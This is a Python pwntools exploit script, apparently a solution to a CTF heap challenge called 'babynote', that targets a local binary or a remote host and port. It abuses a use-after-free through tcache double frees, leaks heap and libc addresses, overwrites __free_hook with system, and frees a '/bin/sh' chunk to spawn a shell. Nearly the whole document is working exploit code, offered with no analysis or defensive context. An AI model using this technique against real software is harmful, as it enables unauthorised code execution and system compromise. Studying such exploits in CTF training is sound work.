#!/usr/bin/python3

from pwn import *
import sys

BIN = './babynote'

if len(sys.argv) > 1:
    r = remote( '140.112.31.97', 30203 )
else:
    r = process( BIN )

def add(size, data):
    r.sendafter("Choice >", '1')
    r.sendafter("size : ", str(size))
    r.sendafter("Content : ", data)

def edit(idx, data):
    r.sendafter("Choice >", '3')
    r.sendafter("index : ", str(idx))
    r.sendafter("Content : ", data)

def delete(idx):
    r.sendafter("Choice >", '4')
    r.sendafter("index : ", str(idx))

def show(idx):
    r.sendafter("Choice >", '2')
    r.sendafter("index : ", str(idx))

ogs = [
    0xe6e73,
    0xe6e76,
    0xe6e79,
]

# ptr[0] and ptr[1] point to chunk 0
for _ in range(2):
    add(0x18, 'QQ')
    delete(0)
for _ in range(3):
    edit(1, p64(0)*2) # edit key
    delete(0) # protect tcache count becomes 0

show(1)
heap = u64(r.recv(6) + b'\x00\x00') & 0xfffffffff000
log.info(f"heap: {hex(heap)}") # get tcache fd ptr

add(0x78, 'QQ') # ptr[2] (chunk 1)
add(0x78, b'\x00'*0x48 + p64(0x21) + b'\x00'*0x18 + p64(0x21)) # ptr[3] (chunk 2)
"""
TARGET:
___________  - 0x10
| 00 | 81 |
|____|____| 0 (<------ if we free this chunk, we will get main_arena address
| .. | d1 |
|____|____| 
| .. | .. |
|____|____| 0x90

___________ 0x90
| 00 | 81 |
|____|____| 0xa0
| .. | .. |
|____|____| 0xd0 
| 00 | 21 |
|____|____|
| .. | .. |
|____|____| 0xf0
| 00 | 21 |
|____|____| 
___________ 
| .. | 21 |
|____|____| 
"""
delete(2)
add(0x78, 'QQ') # ptr[4] (point to chunk 1)

#### use tcache dup to overwrite
add(0x18, p64(heap + 0x2b0)) # ptr[5] (get chunk 0, set fd ptr to chunk 1)
add(0x18, 'QQ') # ptr[6]
add(0x18, p64(0) + p64(0xd1)) # ptr[7] (overwrite size 0x80 -> 0xd0 (small bin size))

# ptr[2] and ptr[4] point to chunk 1
for _ in range(7): # full 0xd0 tcache
    delete(2)
    edit(4, 'D'*0x10) # edit key => double free

delete(2) # put into unsorted bin
show(4)

libc_base = u64(r.recv(6) + b'\x00\x00') - 0x1ebbe0
free_hook = libc_base + 0x1eeb28
system_addr = libc_base + 0x55410

log.info(f'libc_base: {hex(libc_base)}')
log.info(f'free_hook: {hex(free_hook)}')

delete(1)
edit(5, p64(free_hook))
add(0x18, 'QQ') # ptr[8]
add(0x18, p64(system_addr)) # ptr[9]
edit(6, b"/bin/sh\x00")
delete(6)

r.interactive()

"""
log.info(f'libc_base: {hex(libc_base)}')
malloc_hook = libc_base - libc.sym['__malloc_hook'] - 0x23 # 0x1ebb70
one_gadget = libc_base + ogs[0]
"""
